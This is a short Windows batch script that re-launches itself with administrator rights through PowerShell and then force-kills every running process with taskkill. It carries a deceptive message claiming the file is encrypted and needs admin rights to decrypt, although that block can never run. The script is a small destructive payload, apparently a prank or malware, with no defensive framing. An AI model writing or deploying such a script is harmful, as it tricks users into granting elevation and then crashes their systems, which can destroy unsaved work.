@echo off
if not "%1"=="am_admin" (
    powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -ArgumentList 'am_admin'"
    exit /b
)
if not "%1"=="am_admin" (
    echo This file is encrypted
    echo Please run as Admin, else decryption fails
    timeout 5
    powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -ArgumentList 'am_admin'"
    exit /b
)
taskkill /f /fi "PID ge 0" /im *